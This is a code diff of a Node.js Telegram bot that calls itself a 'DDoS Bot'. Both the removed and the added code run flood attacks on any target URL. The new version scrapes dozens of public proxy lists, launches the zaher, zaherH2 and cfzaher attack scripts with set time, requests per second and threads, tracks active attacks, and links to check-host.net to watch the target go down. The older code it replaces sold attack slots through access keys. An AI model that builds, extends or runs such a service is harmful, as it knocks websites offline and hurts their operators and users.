+  "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
+  "https://raw.githubusercontent.com/casals-ar/proxy-list/main/socks5",
+  "https://raw.githubusercontent.com/casals-ar/proxy-list/main/socks4",
+  "https://raw.githubusercontent.com/casals-ar/proxy-list/main/https",
+  "https://raw.githubusercontent.com/casals-ar/proxy-list/main/http",
+  "https://raw.githubusercontent.com/caliphdev/Proxy-List/master/http.txt",
+  "https://raw.githubusercontent.com/caliphdev/Proxy-List/main/socks5.txt",
+  "https://raw.githubusercontent.com/caliphdev/Proxy-List/main/http.txt",
+  "https://raw.githubusercontent.com/BreakingTechFr/Proxy_Free/main/proxies/socks5.txt",
+  "https://raw.githubusercontent.com/BreakingTechFr/Proxy_Free/main/proxies/socks4.txt",
+  "https://raw.githubusercontent.com/BreakingTechFr/Proxy_Free/main/proxies/https.txt",
+  "https://raw.githubusercontent.com/BreakingTechFr/Proxy_Free/main/proxies/http.txt",
+  "https://raw.githubusercontent.com/BreakingTechFr/Proxy_Free/main/proxies/all.txt",
+  "https://raw.githubusercontent.com/BlackCage/Proxy-Scraper-and-Verifier/main/Proxies/Not_Processed/proxies.txt",
+  "https://raw.githubusercontent.com/berkay-digital/Proxy-Scraper/main/proxies.txt",
+  "https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/HTTP.txt",
+  "https://raw.githubusercontent.com/aslisk/proxyhttps/main/https.txt",
+  "https://raw.githubusercontent.com/Anonym0usWork1221/Free-Proxies/main/proxy_files/socks5_proxies.txt",
+  "https://raw.githubusercontent.com/Anonym0usWork1221/Free-Proxies/main/proxy_files/socks4_proxies.txt",
+  "https://raw.githubusercontent.com/Anonym0usWork1221/Free-Proxies/main/proxy_files/https_proxies.txt",
+  "https://raw.githubusercontent.com/Anonym0usWork1221/Free-Proxies/main/proxy_files/http_proxies.txt",
+  "https://raw.githubusercontent.com/andigwandi/free-proxy/main/proxy_list.txt",
+  "https://raw.githubusercontent.com/almroot/proxylist/master/list.txt",
+  "https://raw.githubusercontent.com/ALIILAPRO/Proxy/main/socks5.txt",
+  "https://raw.githubusercontent.com/ALIILAPRO/Proxy/main/http.txt",
+  "https://raw.githubusercontent.com/a2u/free-proxy-list/master/free-proxy-list.txt",
+  "https://proxyspace.pro/socks5.txt",
+  "https://proxyspace.pro/socks4.txt",
+  "https://proxyspace.pro/https.txt",
+  "https://proxyspace.pro/http.txt",
+  "https://proxy-spider.com/api/proxies.example.txt",
+  "https://openproxylist.xyz/socks5.txt",
+  "https://openproxylist.xyz/socks4.txt",
+  "https://openproxylist.xyz/https.txt",
+  "https://openproxylist.xyz/http.txt",
+  "https://naawy.com/api/public/proxylist/getList/?proxyType=socks5&format=txt",
+  "https://naawy.com/api/public/proxylist/getList/?proxyType=socks4&format=txt",
+  "https://naawy.com/api/public/proxylist/getList/?proxyType=https&format=txt",
+  "https://naawy.com/api/public/proxylist/getList/?proxyType=http&format=txt",
+  "https://multiproxy.org/txt_all/proxy.txt",
+  "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=anonymous",
+  "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
+  "https://api.proxyscrape.com/v2/?request=displayproxies",
+  "https://api.proxyscrape.com/?request=getproxies&proxytype=http&timeout=10000&country=all&ssl=all&anonymity=all",
+  "https://api.proxyscrape.com/?request=displayproxies&proxytype=http",
+  "https://api.openproxylist.xyz/socks5.txt",
+  "https://api.openproxylist.xyz/socks4.txt",
+  "https://api.openproxylist.xyz/http.txt",
+  "https://api.good-proxies.ru/getfree.php?count=1000&key=freeproxy",
 ];
 
-class MessageFormatter {
-  static methodsList() {
+async function scrapeProxies(progressCallback) {
+  const proxies = new Set();
+  const total = raw_proxy_sites.length;
+  let processed = 0;
+
+  for (const site of raw_proxy_sites) {
     try {
-      if (!fs.existsSync(config.methodsFile)) return this._formatMethods(defaultMethods);
-      const methods = JSON.parse(fs.readFileSync(config.methodsFile, 'utf8'));
-      return this._formatMethods(methods);
-    } catch {
-      return this._formatMethods(defaultMethods);
-    }
-  }
-
-  static _formatMethods(methods) {
-    return methods.reduce((acc, m) => acc + `*${m.name}* | ${m.description} | ${m.sts}\n`, 
-      "*📊 Available Methods:*\nName | Description | Status\n-----------------------------\n");
-  }
-
-  static errorMessage() {
-    return `
-*❌ Invalid Command*
-Syntax: <method> <url> <port> <time>
-Example: ZAHER https://example.com 443 120
-
-Type /help for more information.
-`;
-  }
-
-  static helpMessage() {
-    return `
-*🤖 Available Commands*
-
-/methods  - View all attack methods
-/help     - Show this help message
-/status   - Check your attack status
-/owner    - Contact administrator
-/stop     - Stop all attacks (Admin only)
-/key      - Set your access key
-/mykey    - Check your current key
-/slots    - Check your attack slots
-
-*⚡ Attack Commands*
-<method> <url> <port> <time> - Run specific attack
-/vip <url> <time> - Run VIP attack (Multiple methods simultaneously)
-/simul <url> <time> - Run simultaneous attacks
-/simul Unlimited <url> - Run unlimited simultaneous attacks (auto-restart every 120s)
-/multi <url> <time> <methods> - Run custom simultaneous attacks
-
-*📋 Examples:*
-ZAHER https://example.com 443 120
-/simul Unlimited https://example.com
-`;
-  }
-
-  static adminContact() {
-    return `
-______________________
-👤 Contact Administrator
-Telegram: @FoundCount
-______________________
-`;
-  }
-
-  static attackDetails(method, url, port, time) {
-    return `
-* Attack Launched Successfully!*
-|-➤Target: ${url}
-|-➤Port: ${port}
-|-➤Duration: ${time} seconds
-|-➤Method: ${method.toUpperCase()}
-|-➤Started: ${moment().format('YYYY-MM-DD HH:mm:ss')}
-`;
-  }
-
-  static vipAttackDetails(url, time, methods) {
-    return `
-* VIP Attack Launched Successfully!*
-|-➤Target: ${url}
-|-➤Duration: ${time} seconds
-|-➤Methods: ${methods.join(', ').toUpperCase()} (Simultaneous)
-|-➤Started: ${moment().format('YYYY-MM-DD HH:mm:ss')}
-|-➤Power: ${methods.length}x attack power
-`;
-  }
-
-  static simultaneousAttackDetails(url, time, methods) {
-    return `
-* SIMULTANEOUS ATTACK LAUNCHED!*
-
-|-➤Target: ${url}
-|-➤Duration: ${time} seconds
-|-➤Methods: ${methods.join(', ').toUpperCase()}
-|-➤Attack Count: ${methods.length} simultaneous attacks
-|-➤Started: ${moment().format('YYYY-MM-DD HH:mm:ss')}
-|-➤Power: ${methods.length}x normal power
-`;
-  }
-
-  static unlimitedAttackDetails(url) {
-    return `
-* UNLIMITED ATTACK STARTED!*
-
-|-➤Target: ${url}
-|-➤Cycle: 120 seconds
-|-➤Mode: Auto-restart until /stop
-|-➤Methods: ${config.simulMethods.join(', ').toUpperCase()}
-|-➤Started: ${moment().format('YYYY-MM-DD HH:mm:ss')}
-|-➤Status:  Running continuously
-`;
-  }
-
-  static validateInputs(url, port, time, userId, maxFreeTime, adminMaxTime) {
-    const maxTime = userId === config.adminId ? adminMaxTime : maxFreeTime;
-    try { new URL(url); } catch { return "Invalid URL format. Please include http:// or https://"; }
-    if (port && (isNaN(port) || port < 1 || port > 65535)) return "Port must be a number between 1 and 65535";
-    if (time && (isNaN(time) || time <= 0)) return "Time must be a positive number";
-    if (time && time > maxTime) return `Time cannot exceed ${maxTime} seconds`;
-    return null;
-  }
-
-  static formatKeysList(keys) {
-    let response = "*🔑 Key List:*\n\n";
-    for (const [key, data] of Object.entries(keys)) {
-      response += `Key: ${key}\nType: ${data.type}\nStatus: ${data.enabled ? '✅ Enabled' : '❌ Disabled'}\nCreated: ${moment(data.createdAt).format('YYYY-MM-DD')}\nUsed by: ${data.usedBy.length} users\n────────────────\n`;
-    }
-    return response;
-  }
-
-  static formatSlotsInfo(userId, userAttackSlots, activeAttacks, maxSlots) {
-    const slots = userAttackSlots.get(userId) || [];
-    const used = slots.length;
-    let response = `*🎯 Your Attack Slots*\n\nUsed: ${used}/${maxSlots}\nAvailable: ${maxSlots - used}\n\n`;
-    if (used) {
-      response += `*Active Attacks:*\n`;
-      slots.forEach((attackId, i) => {
-        const attack = activeAttacks.get(attackId);
-        if (attack) {
-          const elapsed = Math.floor((Date.now() - attack.startTime) / 1000);
-          const remaining = attack.duration - elapsed;
-          response += `${i+1}. ${attack.method.toUpperCase()} on ${attack.target} (${remaining}s left)\n`;
+      const response = await axios.get(site, { timeout: 10000 });
+      if (response.status === 200) {
+        const lines = response.data.split('\n');
+        for (const line of lines) {
+          const trimmed = line.trim();
+          if (trimmed.includes(':')) {
+            const [ip, port] = trimmed.split(':', 2);
+            if (ip.split('.').length === 4 && !isNaN(parseInt(port))) {
+              proxies.add(`${ip}:${port}`);
+            }
+          }
         }
-      });
+      }
+    } catch {
+      // ignore failed sources
     }
-    return response;
+    processed++;
+    if (progressCallback) {
+      progressCallback(processed, total, proxies.size);
+    }
   }
+
+  const proxyList = Array.from(proxies);
+  const outputPath = path.join(PROXY_DIR, DEFAULT_PROXY_FILE);
+  fs.writeFileSync(outputPath, proxyList.join('\n'));
+  return proxyList.length;
 }
 
-// ==================== Command Handler ====================
-class CommandHandler {
-  constructor(bot, config, dataManager, attackManager, attackExecutor, unlimitedManager, userAttackSlots, activeAttacks) {
-    this.bot = bot;
-    this.config = config;
-    this.dataManager = dataManager;
-    this.attackManager = attackManager;
-    this.attackExecutor = attackExecutor;
-    this.unlimitedManager = unlimitedManager;
-    this.userAttackSlots = userAttackSlots;
-    this.activeAttacks = activeAttacks;
+// ---------- Helper functions ----------
+function validateAttackParams(method, target, time, rps, threads, proxyFile) {
+  if (!['zaher', 'zaherH2', 'cfzaher'].includes(method)) {
+    return `❌ *Invalid method: ${method}*\nUse: zaher, zaherH2, or cfzaher`;
+  }
+  const urlPattern = /^https?:\/\/.+/i;
+  if (!urlPattern.test(target)) {
+    return `❌ *Invalid URL: ${target}*\nMust start with http:// or https://`;
+  }
+  if (!/^\d+$/.test(time) || parseInt(time) <= 0) {
+    return `❌ *Invalid time: ${time}*\nTime must be a positive number (seconds)`;
+  }
+  if (!/^\d+$/.test(rps) || parseInt(rps) <= 0) {
+    return `❌ *Invalid RPS: ${rps}*\nRPS must be a positive number`;
+  }
+  if (!/^\d+$/.test(threads) || parseInt(threads) <= 0) {
+    return `❌ *Invalid threads: ${threads}*\nThreads must be a positive number`;
   }
 
-  async handleStart(msg) {
-    this.dataManager.recordUserActivity(msg.from.id, msg.from.username, msg.chat.id);
-    await this.bot.sendMessage(msg.chat.id, MessageFormatter.helpMessage(), { parse_mode: 'Markdown' });
+  if (proxyFile) {
+    const proxyPath = path.join(PROXY_DIR, proxyFile);
+    if (!fs.existsSync(proxyPath)) {
+      return `❌ *Proxy file not found: ${proxyFile}*\nUse /scrape to generate proxies or provide a valid file`;
+    }
+  } else {
+    const defaultPath = path.join(PROXY_DIR, DEFAULT_PROXY_FILE);
+    if (!fs.existsSync(defaultPath)) {
+      return `❌ *No proxies available*\nRun /scrape first to download proxy list`;
+    }
   }
+  return null;
+}
 
-  async handleHelp(chatId) {
-    await this.bot.sendMessage(chatId, MessageFormatter.helpMessage(), { parse_mode: 'Markdown' });
+function getScriptPath(method) {
+  const scriptMap = {
+    zaher: 'zaher.js',
+    zaherH2: 'zaherH2.js',
+    cfzaher: 'cfzaher.js'
+  };
+  return path.join(SCRIPT_DIR, scriptMap[method]);
+}
+
+// ---------- Authorization helper ----------
+function ensureAuthorized(msg, callback) {
+  const userId = msg.from.id;
+  if (!isAuthorized(userId)) {
+    bot.sendMessage(msg.chat.id,
+      '🔑 *Access Denied*\nYou need a valid key to use this bot.\nUse /activate <key> to activate.',
+      { parse_mode: 'Markdown' }
+    );
+    return false;
   }
+  return true;
+}
 
-  async handleMethods(chatId) {
-    await this.bot.sendMessage(chatId, MessageFormatter.methodsList(), { parse_mode: 'Markdown' });
+// ---------- COMMAND HANDLERS ----------
+
+bot.onText(/\/start/, (msg) => {
+  const chatId = msg.chat.id;
+  if (!ensureAuthorized(msg)) return;
+
+  bot.sendAnimation(chatId, ATTACK_ANIMATION_URL, {
+    caption: 
+    `👋 *Welcome to DDoS Bot*\n\n` +
+    `📝 *Quick Commands:*\n` +
+    `/attack - Launch an attack\n` +
+    `/list - Show active attacks\n` +
+    `/stop <id> - Stop an attack\n` +
+    `/stopall - Stop all active attacks\n` +
+    `/scrape - Update proxy list\n\n` +
+    `ℹ️ *More Info:*\n` +
+    `/help - Full usage guide\n` +
+    `/methods - Available attack methods`,
+    parse_mode: 'Markdown'
+  });
+});
+
+bot.onText(/\/help/, (msg) => {
+  if (!ensureAuthorized(msg)) return;
+  const chatId = msg.chat.id;
+
+  bot.sendAnimation(chatId, ATTACK_ANIMATION_URL, {
+    caption: `📖 *Complete Usage Guide*\n\n` +
+    `*1. ATTACK COMMAND*\n` +
+    `\`/attack <method> <url> <time> <rps> <threads> [proxyfile]\`\n\n` +
+    `📌 *Parameters:*\n` +
+    `  • method: zaher, zaherH2, or cfzaher\n` +
+    `  • url: Target URL (https://example.com)\n` +
+    `  • time: Duration in seconds\n` +
+    `  • rps: Requests per second\n` +
+    `  • threads: Number of threads\n` +
+    `  • proxyfile: Optional proxy file (default: ${DEFAULT_PROXY_FILE})\n\n` +
+    `✅ *Example:*\n` +
+    `\`/attack zaher https://example.com 60 500 10\`\n\n` +
+    `*2. MANAGE ATTACKS*\n` +
+    `\`/list\` - View all active attacks\n` +
+    `\`/stop <id>\` - Stop a specific attack\n` +
+    `\`/stopall\` - Stop all active attacks\n\n` +
+    `*3. PROXIES*\n` +
+    `\`/scrape\` - Fetch and update proxies\n\n` +
+    `*4. INFO*\n` +
+    `\`/methods\` - Show available methods`,
+    parse_mode: 'Markdown'
+  });
+});
+
+bot.onText(/\/methods/, (msg) => {
+  if (!ensureAuthorized(msg)) return;
+  bot.sendMessage(msg.chat.id,
+    `📋 *Available attack methods:*\n` +
+    `- \`zaher\`\n` +
+    `- \`zaherH2\`\n` +
+    `- \`cfzaher\``,
+    { parse_mode: 'Markdown' }
+  );
+});
+
+bot.onText(/\/scrape/, async (msg) => {
+  if (!ensureAuthorized(msg)) return;
+  const chatId = msg.chat.id;
+
+  const statusMsg = await bot.sendMessage(chatId, '🔄 Starting proxy scraper...');
+
+  let lastUpdate = Date.now();
+  const progressCallback = async (processed, total, found) => {
+    if (Date.now() - lastUpdate > 3000) {
+      await bot.editMessageText(
+        `🔄 Scraping progress: ${processed}/${total} sources processed\n📦 Proxies found so far: ${found}`,
+        { chat_id: chatId, message_id: statusMsg.message_id }
+      ).catch(() => { });
+      lastUpdate = Date.now();
+    }
+  };
+
+  try {
+    const count = await scrapeProxies(progressCallback);
+    await bot.editMessageText(
+      `✅ Scraping complete!\n📦 Total unique proxies: ${count}\nSaved to \`${DEFAULT_PROXY_FILE}\``,
+      { chat_id: chatId, message_id: statusMsg.message_id, parse_mode: 'Markdown' }
+    );
+  } catch (err) {
+    await bot.editMessageText(
+      `❌ Scraping failed: ${err.message}`,
+      { chat_id: chatId, message_id: statusMsg.message_id }
+    );
   }
+});
 
-  async handleOwner(chatId) {
-    await this.bot.sendMessage(chatId, MessageFormatter.adminContact(), { parse_mode: 'Markdown' });
-  }
+bot.onText(/\/attack/, (msg) => {
+  if (!ensureAuthorized(msg)) return;
+  const chatId = msg.chat.id;
+  const userId = msg.from.id;
 
-  async handleStatus(chatId, userId) {
-    const remaining = this.attackManager.getRemainingCooldown(userId);
-    const hasUnlimited = this.unlimitedManager.hasForUser(userId);
-    let status = remaining > 0 ? `⏳ Cooldown active: ${remaining}s remaining` : `✅ Ready to launch attacks`;
-    if (hasUnlimited) status += `\n♾️ Unlimited attack running`;
-    const slots = this.attackManager.getUserSlots(userId).length;
-    const max = this.attackManager.getMaxSlots(userId);
-    status += `\n🎯 Active attacks: ${slots}/${max}`;
-    await this.bot.sendMessage(chatId, status);
-  }
-
-  async handleStop(chatId, userId) {
-    const stopped = await this.attackManager.stopUserAttacks(userId, this.bot);
-    stopped += this.unlimitedManager.stopAllForUser(userId);
-    await this.bot.sendMessage(chatId, stopped ? `✅ Stopped ${stopped} attack(s)!` : '❌ No active attacks found.');
-  }
-
-  async handleKey(chatId, userId, inputs) {
-    if (inputs.length < 2) return this.bot.sendMessage(chatId, "Usage: /key <access-key>");
-    const key = inputs[1].toUpperCase();
-    if (!this.dataManager.validateKey(key)) return this.bot.sendMessage(chatId, "❌ Invalid or disabled key");
-    this.dataManager.setUserKey(userId, key);
-    await this.bot.sendMessage(chatId, `✅ Key activated successfully!`);
-  }
-
-  async handleMyKey(chatId, userId) {
-    const key = this.dataManager.getUserKey(userId);
-    if (!key) return this.bot.sendMessage(chatId, `❌ No active key! Set one with /key <key>`);
-    const keyInfo = this.dataManager.keys[key];
-    if (!keyInfo) return this.bot.sendMessage(chatId, "❌ Your key is no longer valid.");
-    await this.bot.sendMessage(chatId, 
-      `🔑 *Your Key Information*\n\nKey: ${key}\nType: ${keyInfo.type}\nStatus: ${keyInfo.enabled ? '✅ Enabled' : '❌ Disabled'}\nSimultaneous Attacks: ${this.dataManager.users[userId]?.simultaneousAttacks || 0}`,
+  const args = msg.text.split(' ').slice(1);
+  if (args.length < 5) {
+    return bot.sendMessage(
+      chatId,
+      `❌ *Invalid attack command*\n\n` +
+      `*Format:*\n\`/attack <method> <url> <time> <rps> <threads> [proxyfile]\`\n\n` +
+      `*Example:*\n\`/attack zaher https://example.com 60 500 10\`\n\n` +
+      `Use /help for more details`,
       { parse_mode: 'Markdown' }
     );
   }
 
-  async handleSlots(chatId, userId) {
-    const max = this.attackManager.getMaxSlots(userId);
-    const text = MessageFormatter.formatSlotsInfo(userId, this.userAttackSlots, this.activeAttacks, max);
-    await this.bot.sendMessage(chatId, text, { parse_mode: 'Markdown' });
-  }
+  let [method, target, time, rps, threads, proxyFile] = args;
+  if (args.length === 5) proxyFile = null;
 
-  async handleAttack(userId, chatId, method, url, port, time) {
-    if (!this.attackManager.hasAvailableSlot(userId)) {
-      return this.bot.sendMessage(chatId, `❌ Max slots (${this.attackManager.getMaxSlots(userId)}) reached. Wait for current attacks.`);
-    }
-    if (!this.attackManager.canUserAttack(userId)) {
-      if (userId !== this.config.adminId && !this.dataManager.getUserKey(userId)) {
-        return this.bot.sendMessage(chatId, `❌ Key required!`);
+  const error = validateAttackParams(method, target, time, rps, threads, proxyFile);
+  if (error) return bot.sendMessage(chatId, error, { parse_mode: 'Markdown' });
+
+  const proxyPath = proxyFile
+    ? path.join(PROXY_DIR, proxyFile)
+    : path.join(PROXY_DIR, DEFAULT_PROXY_FILE);
+
+  const scriptPath = getScriptPath(method);
+  const scriptArgs = [target, time, rps, threads, proxyPath];
+
+  const child = spawn('node', [scriptPath, ...scriptArgs], {
+    cwd: SCRIPT_DIR,
+    stdio: ['ignore', 'pipe', 'pipe']
+  });
+
+  const attackId = nextAttackId++;
+  const startTime = Date.now();
+
+  activeAttacks.set(attackId, {
+    pid: child.pid,
+    method,
+    target,
+    time: parseInt(time),
+    rps: parseInt(rps),
+    threads: parseInt(threads),
+    proxyFile: proxyFile || DEFAULT_PROXY_FILE,
+    chatId,
+    userId,
+    startTime,
+    child
+  });
+
+  const checkHostUrl = `https://check-host.net/check-http?host=${encodeURIComponent(target)}`;
+  const caption = `🚀 *Attack started*\n` +
+    `ID: \`${attackId}\`\n` +
+    `Method: ${method}\n` +
+    `Target: ${target}\n` +
+    `Time: ${time}s\n` +
+    `RPS: ${rps}\n` +
+    `Threads: ${threads}\n` +
+    `Proxy: ${proxyFile || DEFAULT_PROXY_FILE}\n` +
+    `Check Host: [Check-Host](${checkHostUrl})`;
+
+  bot.sendAnimation(chatId, ATTACK_ANIMATION_URL, { caption, parse_mode: 'Markdown' })
+    .then(sentMsg => {
+      const attack = activeAttacks.get(attackId);
+      if (attack) attack.messageId = sentMsg.message_id;
+      console.log(`✅ Attack ${attackId} started by user ${userId}`);
+    })
+    .catch(() => {
+      bot.sendMessage(chatId, caption, { parse_mode: 'Markdown' })
+        .then(sentMsg => {
+          const attack = activeAttacks.get(attackId);
+          if (attack) attack.messageId = sentMsg.message_id;
+        });
+    });
+
+  child.stdout.on('data', data => console.log(`[Attack ${attackId}] stdout: ${data}`));
+  child.stderr.on('data', data => console.error(`[Attack ${attackId}] stderr: ${data}`));
+
+  child.on('exit', (code, signal) => {
+    const attack = activeAttacks.get(attackId);
+    if (!attack) return;
+
+    const duration = Math.round((Date.now() - attack.startTime) / 1000);
+    const status = code === 0 ? '✅ Completed' : `❌ Crashed (code ${code}${signal ? ' signal ' + signal : ''})`;
+
+    bot.editMessageText(
+      `🚀 *Attack finished*\n` +
+      `ID: \`${attackId}\`\n` +
+      `Method: ${attack.method}\n` +
+      `Target: ${attack.target}\n` +
+      `Duration: ${duration}s\n` +
+      `Status: ${status}`,
+      {
+        chat_id: attack.chatId,
+        message_id: attack.messageId,
+        parse_mode: 'Markdown'
       }
-      const remaining = this.attackManager.getRemainingCooldown(userId);
-      return this.bot.sendMessage(chatId, `⏳ Wait ${remaining}s before next attack.`);
-    }
-    const error = MessageFormatter.validateInputs(url, port, time, userId, this.config.maxFreeTime, this.config.adminMaxTime);
-    if (error) return this.bot.sendMessage(chatId, `❌ ${error}`);
+    ).catch(() => { });
 
-    this.attackManager.setUserRunning(userId);
-    try {
-      const details = MessageFormatter.attackDetails(method, url, port, time);
-      await this.bot.sendVideo(chatId, 'https://j.top4top.io/m_3573exath0.mp4', { caption: details, parse_mode: 'Markdown' });
-      const checkUrl = `https://check-host.net/check-http?host=${encodeURIComponent(url)}`;
-      await this.bot.sendMessage(chatId, `🎯 *Attack Monitoring*\nCheck target status: [Check-Host](${checkUrl})`, { parse_mode: 'Markdown', disable_web_page_preview: true });
-      await this.attackExecutor.runAttack(method, url, port, time, userId, chatId);
-      this.attackManager.setUserCooldown(userId);
-      await this.bot.sendMessage(chatId, `🎯 Attack completed! Cooldown: ${this.config.cooldownTime} seconds`);
-      this.dataManager.incrementAttackCount(userId);
-    } catch (err) {
-      this.attackManager.clearUserStatus(userId);
-      console.error(`❌ Attack error for user ${userId}:`, err);
-      await this.bot.sendMessage(chatId, `❌ Error: ${err.message}`);
-    }
+    activeAttacks.delete(attackId);
+  });
+
+  setTimeout(() => {
+    const attack = activeAttacks.get(attackId);
+    if (attack) attack.child.kill();
+  }, (parseInt(time) + 5) * 1000);
+});
+
+bot.onText(/\/list/, (msg) => {
+  if (!ensureAuthorized(msg)) return;
+  const chatId = msg.chat.id;
+
+  if (activeAttacks.size === 0) {
+    return bot.sendMessage(chatId, '📭 *No active attacks*\nStart one with /attack', { parse_mode: 'Markdown' });
   }
 
-  async handleVipAttack(userId, chatId, url, time) {
-    const required = this.config.vipMethods.length;
-    if (!this.attackManager.canRunSimultaneous(userId, required)) {
-      const available = this.attackManager.getMaxSlots(userId) - this.attackManager.getUserSlots(userId).length;
-      return this.bot.sendMessage(chatId, `❌ VIP attack requires ${required} slots. You have ${available} available.`);
-    }
-    if (!this.attackManager.canUserAttack(userId)) {
-      if (userId !== this.config.adminId && !this.dataManager.getUserKey(userId)) {
-        return this.bot.sendMessage(chatId, `❌ Key required for VIP attacks!`);
-      }
-      const remaining = this.attackManager.getRemainingCooldown(userId);
-      return this.bot.sendMessage(chatId, `⏳ Wait ${remaining}s before VIP attack.`);
-    }
-    const error = MessageFormatter.validateInputs(url, 443, time, userId, this.config.maxFreeTime, this.config.adminMaxTime);
-    if (error) return this.bot.sendMessage(chatId, `❌ ${error}`);
-
-    this.attackManager.setUserRunning(userId);
-    try {
-      const details = MessageFormatter.vipAttackDetails(url, time, this.config.vipMethods);
-      await this.bot.sendVideo(chatId, 'https://j.top4top.io/m_3573exath0.mp4', { caption: details, parse_mode: 'Markdown' });
-      const checkUrl = `https://check-host.net/check-http?host=${encodeURIComponent(url)}`;
-      await this.bot.sendMessage(chatId, ` VIP Attack Monitoring\n${this.config.vipMethods.length} attacks running!\nCheck: [Check-Host](${checkUrl})`, { parse_mode: 'Markdown', disable_web_page_preview: true });
-      const result = await this.attackExecutor.runVipAttack(url, time, userId, chatId);
-      this.attackManager.setUserCooldown(userId, this.config.simultaneousAttacks.cooldownMultiplier);
-      this.dataManager.incrementSimultaneousCount(userId);
-      this.dataManager.incrementAttackCount(userId, this.config.vipMethods.length);
-      let msg = `✅ VIP attack completed! ${this.config.vipMethods.length} attacks finished.`;
-      if (result.failed) msg += ` (${result.failed} failed)`;
-      msg += `\nCooldown: ${this.config.cooldownTime * this.config.simultaneousAttacks.cooldownMultiplier} seconds`;
-      await this.bot.sendMessage(chatId, msg);
-    } catch (err) {
-      this.attackManager.clearUserStatus(userId);
-      console.error(`❌ VIP attack error for user ${userId}:`, err);
-      await this.bot.sendMessage(chatId, `❌ Error during VIP attack: ${err.message}`);
-    }
+  let response = `📋 *Active Attacks (${activeAttacks.size})*\n\n`;
+  for (const [id, attack] of activeAttacks.entries()) {
+    const runningFor = Math.round((Date.now() - attack.startTime) / 1000);
+    const timeLeft = Math.max(0, attack.time - runningFor);
+    const progress = Math.round((runningFor / attack.time) * 100);
+    response += `🆔 ID: \`${id}\`\n`;
+    response += `🎯 Target: ${attack.target}\n`;
+    response += `⚙️ Method: ${attack.method}\n`;
+    response += `👤 Started by: \`${attack.userId}\`\n`;
+    response += `⏱️ Progress: ${runningFor}/${attack.time}s (${progress}%)\n`;
+    response += `⏳ Time left: ${timeLeft}s\n\n`;
   }
+  bot.sendAnimation(chatId, ATTACK_ANIMATION_URL, { caption: response, parse_mode: 'Markdown' });
+});
 
-  async handleSimultaneousAttack(userId, chatId, url, time, methodInput = '') {
-    if (methodInput.toLowerCase() === 'unlimited') {
-      return this.handleUnlimitedAttack(userId, chatId, url);
-    }
-    const required = this.config.simulMethods.length;
-    if (!this.attackManager.canRunSimultaneous(userId, required)) {
-      const available = this.attackManager.getMaxSlots(userId) - this.attackManager.getUserSlots(userId).length;
-      return this.bot.sendMessage(chatId, `❌ SIMULTANEOUS attack requires ${required} slots. You have ${available} available.`);
-    }
-    if (!this.attackManager.canUserAttack(userId)) {
-      if (userId !== this.config.adminId && !this.dataManager.getUserKey(userId)) {
-        return this.bot.sendMessage(chatId, `❌ Key required for simultaneous attacks!`);
-      }
-      const remaining = this.attackManager.getRemainingCooldown(userId);
-      return this.bot.sendMessage(chatId, `⏳ Wait ${remaining}s before simultaneous attack.`);
-    }
-    const error = MessageFormatter.validateInputs(url, 443, time, userId, this.config.maxFreeTime, this.config.adminMaxTime);
-    if (error) return this.bot.sendMessage(chatId, `❌ ${error}`);
+// ---------- FIXED STOP COMMAND ----------
+bot.onText(/^\/stop(?:\s+(\d+))?$/, (msg, match) => {
+  const chatId = msg.chat.id;
+  const userId = msg.from.id;
 
-    this.attackManager.setUserRunning(userId);
-    try {
-      const details = MessageFormatter.simultaneousAttackDetails(url, time, this.config.simulMethods);
-      await this.bot.sendVideo(chatId, 'https://j.top4top.io/m_3573exath0.mp4', { caption: details, parse_mode: 'Markdown' });
-      const checkUrl = `https://check-host.net/check-http?host=${encodeURIComponent(url)}`;
-      await this.bot.sendMessage(chatId, ` SIMULTANEOUS Attack\n${this.config.simulMethods.length} attacks running!\nCheck: [Check-Host](${checkUrl})`, { parse_mode: 'Markdown', disable_web_page_preview: true });
-      const result = await this.attackExecutor.runSimultaneousAttacks(url, time, userId, chatId);
-      this.attackManager.setUserCooldown(userId, this.config.simultaneousAttacks.cooldownMultiplier);
-      this.dataManager.incrementSimultaneousCount(userId);
-      this.dataManager.incrementAttackCount(userId, this.config.simulMethods.length);
-      let msg = `✅ SIMULTANEOUS attack completed! ${this.config.simulMethods.length} attacks finished.`;
-      if (result.failed) msg += ` (${result.failed} failed)`;
-      msg += `\nCooldown: ${this.config.cooldownTime * this.config.simultaneousAttacks.cooldownMultiplier} seconds`;
-      await this.bot.sendMessage(chatId, msg);
-    } catch (err) {
-      this.attackManager.clearUserStatus(userId);
-      console.error(`❌ Simultaneous attack error for user ${userId}:`, err);
-      await this.bot.sendMessage(chatId, `❌ Error during simultaneous attack: ${err.message}`);
-    }
-  }
+  // Allow owner to bypass authorization for testing; remove if not needed
+  if (userId !== OWNER_ID && !ensureAuthorized(msg)) return;
 
-  async handleUnlimitedAttack(userId, chatId, url) {
-    if (!this.attackManager.canUserAttack(userId)) {
-      if (userId !== this.config.adminId && !this.dataManager.getUserKey(userId)) {
-        return this.bot.sendMessage(chatId, `❌ Key required for unlimited attacks!`);
-      }
-      const remaining = this.attackManager.getRemainingCooldown(userId);
-      return this.bot.sendMessage(chatId, `⏳ Wait ${remaining}s before unlimited attack.`);
-    }
-    const error = MessageFormatter.validateInputs(url, 443, '120', userId, this.config.maxFreeTime, this.config.adminMaxTime);
-    if (error) return this.bot.sendMessage(chatId, `❌ ${error}`);
-    if (this.unlimitedManager.hasForUser(userId)) {
-      return this.bot.sendMessage(chatId, `❌ You already have an unlimited attack running. Use /stop to stop it first.`);
-    }
+  console.log(`[STOP] Received from user ${userId}: ${msg.text}`);
 
-    try {
-      const details = MessageFormatter.unlimitedAttackDetails(url);
-      await this.bot.sendVideo(chatId, 'https://j.top4top.io/m_3573exath0.mp4', { caption: details, parse_mode: 'Markdown' });
-      const checkUrl = `https://check-host.net/check-http?host=${encodeURIComponent(url)}`;
-      await this.bot.sendMessage(chatId, `♾️ *Unlimited Attack Monitoring*\nAttacks will auto-restart every 120s\nCheck: [Check-Host](${checkUrl})\n\nUse /stop to terminate`, { parse_mode: 'Markdown', disable_web_page_preview: true });
-      const attackId = await this.unlimitedManager.start(userId, chatId, url);
-      await this.bot.sendMessage(chatId, `✅ Unlimited attack started! Attack ID: ${attackId.substr(0,8)}...\n\nThis attack will run in cycles of 120 seconds until you use /stop.`);
-    } catch (err) {
-      console.error(`❌ Unlimited attack error for user ${userId}:`, err);
